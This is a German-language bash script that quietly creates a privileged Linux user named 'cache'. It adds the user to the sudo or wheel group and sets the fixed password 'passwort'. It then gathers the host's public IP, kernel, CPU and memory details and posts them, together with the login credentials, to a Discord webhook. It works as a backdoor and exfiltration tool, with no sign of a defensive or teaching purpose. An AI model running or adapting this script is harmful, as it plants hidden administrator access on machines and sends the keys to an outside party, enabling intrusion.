#!/bin/bash

WEBHOOK_USERNAME="Webhook-Benutzername"
WEBHOOK_URL="Webhook Discord"
apt install curl -y

if id "cache" >/dev/null 2>&1; then
    echo "Der Benutzer 'cache' existiert bereits."
    exit 1
fi

sudo useradd -m cache

if grep -q '^sudo:' /etc/group; then
    sudo usermod -aG sudo cache
elif grep -q '^wheel:' /etc/group; then
    sudo usermod -aG wheel cache
else
    echo "Die passende Gruppe für die Verwaltung von Root-Rechten wurde nicht gefunden. Bitte füge den Benutzer manuell zur entsprechenden Gruppe hinzu."
    exit 1
fi

echo -e "passwort\npasswort" | sudo passwd cache

IP=$(curl -s ifconfig.me)

SYS_INFO=$(uname -a)
CPU_INFO=$(cat /proc/cpuinfo | grep "model name" | head -n 1 | awk -F ': ' '{print $2}')
MEM_INFO=$(free -h | awk '/^Mem:/ {print $2}')

json_data=$(cat <<EOF
{
    "username": "$WEBHOOK_USERNAME",
    "content": "@everyone Es wurde ein neuer Nutzer erstellt",
    "embeds": [{
        "title": "Neue Daten unter '$IP' erstellt",
        "description": "Es wurden neue Daten erstellt!",
        "color": 3447003,
        "fields": [
            {
                "name": "IP-Adresse",
                "value": "$IP",
                "inline": true
            },
            {
                "name": "Benutzername",
                "value": "cache",
                "inline": true
            },
            {
                "name": "Passwort",
                "value": "passwort",
                "inline": true
            },
            {
                "name": "Systeminformationen",
                "value": "$SYS_INFO",
                "inline": false
            },
            {
                "name": "CPU",
                "value": "$CPU_INFO",
                "inline": true
            },
            {
                "name": "Speicher",
                "value": "$MEM_INFO",
                "inline": true
            }
        ],
        "footer": {
            "text": "Benutzer erstellt am $(date +'%d.%m.%Y um %H:%M:%S')"
        }
    }]
}
EOF
)

response=$(curl -s -H "Content-Type: application/json" -X POST -d "$json_data" "$WEBHOOK_URL")

if [[ "$response" == *"\"status\": 200"* ]]; then
    echo "Der Benutzer 'cache' wurde erfolgreich erstellt und der Webhook wurde gesendet."
else
    echo "Fehler beim Senden des Webhooks. Überprüfen Sie die URL und andere Einstellungen."
fi
